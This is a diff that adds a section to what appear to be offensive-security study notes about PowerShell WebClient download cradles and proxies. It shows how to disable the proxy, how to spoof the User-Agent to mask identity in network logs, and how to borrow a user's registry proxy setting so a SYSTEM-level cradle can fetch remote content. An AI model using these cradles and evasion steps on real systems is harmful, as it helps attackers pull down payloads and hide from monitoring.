@@ -795,3 +795,48 @@ Explanation:
 &nbsp;
 
 # Working With Proxy
+
+- The Net.WebClient cradle used in powershell is proxy aware. It can automatically route seamlessly through proxies.
+- In case proxy is to be disabled, we can set the proxy method to null
+- Code :
+  $wc = new-object system.net.WebClient
+  $wc.proxy = $null
+  $wc.DownloadString("<link>")
+
+- We Can also change the User-Agent if required, this can be used to mask our identity in network logs.
+- Code :
+  $wc = new-object system.net.WebClient
+  $wc.Headers.Add('User-Agent', "<User-Agent name>")
+  $wc.DownloadString("<link>")
+
+- The powershell download cradle using SYSTEM integrity **does not have proxy configuration set**.
+- This can however be solved by copying the proxy address from the Local Users Registry Keys to the System Registry keys.
+
+&nbsp;
+
+Powershell script :
+
+    New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
+    $keys = Get-ChildItem 'HKU:\' ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
+    $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+    [system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
+    $wc = new-object system.net.WebClient
+    $wc.DownloadString("<link>")
+
+&nbsp;
+
+Explanation :
+
+1. We first map the HKEY_USERS registry hive.
+2. We then filter in the keys which have **S-1-5-21** in them, SIDs which start with this pattern are User Accounts, exclusive of built-in accounts.
+3. We then fetch the value of ProxyServer and store it in a variable
+4. We can now set the proxy of the download cradle to this value
+5. Followed by making a web request, we can see that it goes through the proxy server
+
+&nbsp;
+
+> Documentation :
+>
+> - https://docs.microsoft.com/en-us/dotnet/api/system.net.webproxy?view=netframework-4.8
+> - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.2&viewFallbackFrom=powershell-6
+> - https://support.microsoft.com/en-gb/topic/29615e3f-0bfc-6e3e-d377-e8986e243a30?msclkid=b900455cbbbd11ecba75059c38cf0d60
